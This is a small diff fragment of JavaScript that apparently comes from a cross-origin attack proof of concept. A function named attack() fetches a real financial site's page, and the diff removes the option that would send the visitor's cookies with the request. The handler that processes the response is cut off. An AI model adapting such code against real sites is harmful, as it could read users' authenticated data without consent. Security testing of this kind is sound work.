@@ -13,7 +13,6 @@
     function attack() {
       fetch("https://www.principal.com/", {
         method: "GET",
-        credentials: "include"
       })
       .then(res => res.text())
       .then(data => {
